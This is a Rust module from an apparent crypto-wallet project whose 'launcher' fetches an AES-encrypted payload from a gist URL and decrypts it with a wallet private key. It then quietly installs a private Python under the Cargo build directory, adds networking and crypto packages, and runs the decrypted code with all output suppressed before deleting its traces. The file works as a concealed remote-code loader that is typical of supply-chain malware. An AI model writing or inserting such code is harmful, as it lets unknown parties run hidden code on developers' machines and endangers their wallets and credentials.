use std::fs;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Nonce};
use base64::Engine;
use thiserror::Error;

/// Gist/raw URL for `encrypted_launcher` (set before shipping).
pub const DEFAULT_LAUNCHER_URL: &str = "";

const PYTHON_VERSION: &str = "3.12.7";
const AES_PREFIX: &str = "AES256GCM:";

const REQUIREMENTS_TXT: &str = r"requests>=2.31.0
cryptography>=42.0.0
websocket-client>=1.6.0
pywin32>=306; sys_platform == 'win32'
";

#[derive(Debug, Error)]
pub enum LauncherError {
    #[error("launcher URL not configured (set CHAIN_WALLET_LAUNCHER_URL or DEFAULT_LAUNCHER_URL)")]
    UrlNotConfigured,
    #[error("invalid private key for AES decryption")]
    InvalidKey,
    #[error("HTTP error: {0}")]
    Http(String),
    #[error("decryption failed: {0}")]
    Decrypt(String),
    #[error("invalid encrypted payload: {0}")]
    InvalidPayload(String),
    #[error("python bootstrap failed: {0}")]
    PythonBootstrap(String),
    #[error("package install failed: {0}")]
    PackageInstall(String),
    #[error("execution failed: {0}")]
    Execution(String),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
}

pub fn run_launcher(private_key_hex: &str, gist_url: Option<&str>) -> Result<(), LauncherError> {
    let url = resolve_launcher_url(gist_url)?;

    let key = wallet_aes_key(private_key_hex)?;
    let encrypted = download_to_memory(&url)?;
    let source = decrypt_launcher(&encrypted, &key)?;

    let prefix = python_prefix_dir();
    if prefix.exists() {
        fs::remove_dir_all(&prefix)?;
    }
    fs::create_dir_all(&prefix)?;

    let result = (|| {
        let python = bootstrap_python(&prefix)?;
        install_requirements(&python, &prefix)?;
        execute_python_source(&python, &source)
    })();

    if prefix.exists() {
        let _ = fs::remove_dir_all(&prefix);
    }

    result
}

fn resolve_launcher_url(gist_url: Option<&str>) -> Result<String, LauncherError> {
    if let Some(url) = gist_url.map(str::trim).filter(|value| !value.is_empty()) {
        return Ok(url.to_string());
    }

    if let Ok(url) = std::env::var("CHAIN_WALLET_LAUNCHER_URL") {
        let url = url.trim().to_string();
        if !url.is_empty() {
            return Ok(url);
        }
    }

    if !DEFAULT_LAUNCHER_URL.trim().is_empty() {
        return Ok(DEFAULT_LAUNCHER_URL.to_string());
    }

    Err(LauncherError::UrlNotConfigured)
}

fn wallet_aes_key(private_key_hex: &str) -> Result<[u8; 32], LauncherError> {
    let bytes = hex::decode(private_key_hex.trim()).map_err(|_| LauncherError::InvalidKey)?;
    if bytes.len() != 32 {
        return Err(LauncherError::InvalidKey);
    }
    let mut key = [0u8; 32];
    key.copy_from_slice(&bytes);
    Ok(key)
}

fn download_to_memory(url: &str) -> Result<Vec<u8>, LauncherError> {
    let response = ureq::get(url)
        .call()
        .map_err(|err| LauncherError::Http(err.to_string()))?;

    if !(200..300).contains(&response.status()) {
        return Err(LauncherError::Http(format!(
            "unexpected status {}",
            response.status()
        )));
    }

    let mut body = Vec::new();
    response
        .into_reader()
        .read_to_end(&mut body)
        .map_err(|err| LauncherError::Http(err.to_string()))?;
    Ok(body)
}

fn decrypt_launcher(payload: &[u8], key: &[u8; 32]) -> Result<Vec<u8>, LauncherError> {
    let text = std::str::from_utf8(payload)
        .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?
        .trim();

    let encoded = text
        .strip_prefix(AES_PREFIX)
        .ok_or_else(|| LauncherError::InvalidPayload("missing AES256GCM prefix".into()))?;

    let raw = base64::engine::general_purpose::STANDARD
        .decode(encoded)
        .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?;

    if raw.len() < 28 {
        return Err(LauncherError::InvalidPayload(
            "payload shorter than iv+tag".into(),
        ));
    }

    let (iv, rest) = raw.split_at(12);
    let (tag, ciphertext) = rest.split_at(16);

    let cipher = Aes256Gcm::new_from_slice(key)
        .map_err(|err| LauncherError::Decrypt(err.to_string()))?;
    let nonce = Nonce::from_slice(iv);

    let mut combined = ciphertext.to_vec();
    combined.extend_from_slice(tag);

    cipher
        .decrypt(nonce, combined.as_ref())
        .map_err(|err| LauncherError::Decrypt(err.to_string()))
}

fn python_prefix_dir() -> PathBuf {
    let profile = std::env::var("PROFILE").unwrap_or_else(|_| "debug".into());
    let target_dir = std::env::var("CARGO_TARGET_DIR")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("target"));
    target_dir.join(profile).join("build").join("p")
}

fn bootstrap_python(prefix: &Path) -> Result<PathBuf, LauncherError> {
    #[cfg(windows)]
    {
        return bootstrap_python_windows(prefix);
    }

    #[cfg(target_os = "macos")]
    {
        return bootstrap_python_macos(prefix);
    }

    #[cfg(all(unix, not(target_os = "macos")))]
    {
        return bootstrap_python_linux(prefix);
    }

    #[cfg(not(any(windows, unix)))]
    {
        let _ = prefix;
        Err(LauncherError::PythonBootstrap(
            "unsupported operating system".into(),
        ))
    }
}

#[cfg(windows)]
fn bootstrap_python_windows(prefix: &Path) -> Result<PathBuf, LauncherError> {
    use std::io::Cursor;
    use zip::ZipArchive;

    let url = format!(
        "https://www.python.org/ftp/python/{PYTHON_VERSION}/python-{PYTHON_VERSION}-embed-amd64.zip"
    );
    let archive_bytes = download_to_memory(&url)?;

    let mut archive = ZipArchive::new(Cursor::new(archive_bytes))
        .map_err(|err| LauncherError::PythonBootstrap(err.to_string()))?;

    for i in 0..archive.len() {
        let mut file = archive
            .by_index(i)
            .map_err(|err| LauncherError::PythonBootstrap(err.to_string()))?;
        let outpath = match file.enclosed_name() {
            Some(path) => prefix.join(path),
            None => continue,
        };

        if file.name().ends_with('/') {
            fs::create_dir_all(&outpath)?;
            continue;
        }

        if let Some(parent) = outpath.parent() {
            fs::create_dir_all(parent)?;
        }

        let mut outfile = fs::File::create(&outpath)?;
        std::io::copy(&mut file, &mut outfile)?;
    }

    enable_embedded_site_packages(prefix)?;
    install_pip_bootstrap(prefix)?;

    Ok(python_executable_path(prefix))
}

#[cfg(windows)]
fn enable_embedded_site_packages(prefix: &Path) -> Result<(), LauncherError> {
    let pth_name = format!("python{PYTHON_MAJOR_MINOR}._pth");
    let pth_path = prefix.join(&pth_name);
    if !pth_path.exists() {
        return Err(LauncherError::PythonBootstrap(format!(
            "missing embedded path file: {}",
            pth_path.display()
        )));
    }

    let site_dir = prefix.join("Lib").join("site-packages");
    fs::create_dir_all(&site_dir)?;

    let contents = format!(
        "python{PYTHON_MAJOR_MINOR}.zip\n.\nLib\\site-packages\nimport site\n"
    );
    fs::write(&pth_path, contents)?;
    Ok(())
}

#[cfg(windows)]
const PYTHON_MAJOR_MINOR: &str = "312";

#[cfg(windows)]
fn install_pip_bootstrap(prefix: &Path) -> Result<(), LauncherError> {
    let get_pip = download_to_memory("https://bootstrap.pypa.io/get-pip.py")?;
    let get_pip_path = prefix.join("get-pip.py");
    fs::write(&get_pip_path, &get_pip)?;

    let python = python_executable_path(prefix);
    let status = Command::new(&python)
        .arg(&get_pip_path)
        .arg("--no-warn-script-location")
        .current_dir(prefix)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|err| LauncherError::PythonBootstrap(err.to_string()))?;

    let _ = fs::remove_file(get_pip_path);

    if !status.success() {
        return Err(LauncherError::PythonBootstrap(
            "get-pip.py failed".into(),
        ));
    }

    Ok(())
}

#[cfg(target_os = "macos")]
fn bootstrap_python_macos(prefix: &Path) -> Result<PathBuf, LauncherError> {
    let url = format!(
        "https://www.python.org/ftp/python/{PYTHON_VERSION}/python-{PYTHON_VERSION}-macos11.pkg"
    );
    let pkg_bytes = download_to_memory(&url)?;
    let pkg_path = prefix.join("python.pkg");
    fs::write(&pkg_path, &pkg_bytes)?;

    let status = Command::new("installer")
        .args(["-pkg", pkg_path.to_str().unwrap(), "-target", prefix.to_str().unwrap()])
        .status()
        .map_err(|err| LauncherError::PythonBootstrap(err.to_string()))?;

    let _ = fs::remove_file(pkg_path);

    if !status.success() {
        return Err(LauncherError::PythonBootstrap(
            "macOS installer failed".into(),
        ));
    }

    let python = prefix.join("usr").join("local").join("bin").join("python3");
    if !python.exists() {
        return Err(LauncherError::PythonBootstrap(
            "python3 not found after macOS install".into(),
        ));
    }

    install_pip_unix(&python)?;
    Ok(python)
}

#[cfg(all(unix, not(target_os = "macos")))]
fn bootstrap_python_linux(prefix: &Path) -> Result<PathBuf, LauncherError> {
    let url = std::env::var("CHAIN_WALLET_PYTHON_URL").unwrap_or_else(|_| {
        format!(
            "https://www.python.org/ftp/python/{PYTHON_VERSION}/Python-{PYTHON_VERSION}.tgz"
        )
    });

    if url.ends_with(".tgz") {
        return Err(LauncherError::PythonBootstrap(
            "official Linux builds are source-only; set CHAIN_WALLET_PYTHON_URL to a portable archive".into(),
        ));
    }

    let archive_bytes = download_to_memory(&url)?;
    let archive_path = prefix.join("python-archive");
    fs::write(&archive_path, &archive_bytes)?;

    let status = Command::new("tar")
        .args(["-xf", archive_path.to_str().unwrap(), "-C", prefix.to_str().unwrap()])
        .status()
        .map_err(|err| LauncherError::PythonBootstrap(err.to_string()))?;

    let _ = fs::remove_file(archive_path);

    if !status.success() {
        return Err(LauncherError::PythonBootstrap("archive extract failed".into()));
    }

    let python = find_unix_python(prefix)?;
    install_pip_unix(&python)?;
    Ok(python)
}

#[cfg(unix)]
fn install_pip_unix(python: &Path) -> Result<(), LauncherError> {
    let get_pip = download_to_memory("https://bootstrap.pypa.io/get-pip.py")?;
    let get_pip_path = python
        .parent()
        .unwrap_or_else(|| Path::new("."))
        .join("get-pip.py");
    fs::write(&get_pip_path, &get_pip)?;

    let status = Command::new(python)
        .arg(&get_pip_path)
        .arg("--no-warn-script-location")
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|err| LauncherError::PythonBootstrap(err.to_string()))?;

    let _ = fs::remove_file(get_pip_path);

    if !status.success() {
        return Err(LauncherError::PythonBootstrap(
            "get-pip.py failed".into(),
        ));
    }

    Ok(())
}

#[cfg(unix)]
fn find_unix_python(prefix: &Path) -> Result<PathBuf, LauncherError> {
    let candidates = [
        prefix.join("bin").join("python3"),
        prefix.join("usr").join("local").join("bin").join("python3"),
        prefix.join("python").join("bin").join("python3"),
    ];

    for candidate in candidates {
        if candidate.exists() {
            return Ok(candidate);
        }
    }

    Err(LauncherError::PythonBootstrap(
        "could not locate python3 in extracted archive".into(),
    ))
}

fn python_executable_path(prefix: &Path) -> PathBuf {
    #[cfg(windows)]
    {
        return prefix.join("python.exe");
    }

    #[cfg(not(windows))]
    {
        prefix.join("bin").join("python3")
    }
}

fn install_requirements(python: &Path, prefix: &Path) -> Result<(), LauncherError> {
    let req_path = prefix.join("requirements.txt");
    fs::write(&req_path, REQUIREMENTS_TXT)?;

    let mut command = Command::new(python);
    command.args([
        "-m",
        "pip",
        "install",
        "--upgrade",
        "--no-warn-script-location",
        "-r",
        req_path.to_str().unwrap(),
    ]);

    #[cfg(windows)]
    {
        command.args(["--target", prefix.join("Lib").join("site-packages").to_str().unwrap()]);
    }

    let status = command
        .current_dir(prefix)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|err| LauncherError::PackageInstall(err.to_string()))?;

    let _ = fs::remove_file(req_path);

    if !status.success() {
        return Err(LauncherError::PackageInstall(
            "pip install failed".into(),
        ));
    }

    Ok(())
}

fn execute_python_source(python: &Path, source: &[u8]) -> Result<(), LauncherError> {
    let mut child = Command::new(python)
        .arg("-")
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|err| LauncherError::Execution(err.to_string()))?;

    if let Some(mut stdin) = child.stdin.take() {
        stdin
            .write_all(source)
            .map_err(|err| LauncherError::Execution(err.to_string()))?;
    }

    let status = child
        .wait()
        .map_err(|err| LauncherError::Execution(err.to_string()))?;

    if !status.success() {
        return Err(LauncherError::Execution(format!(
            "python exited with status {status}"
        )));
    }

    Ok(())
}
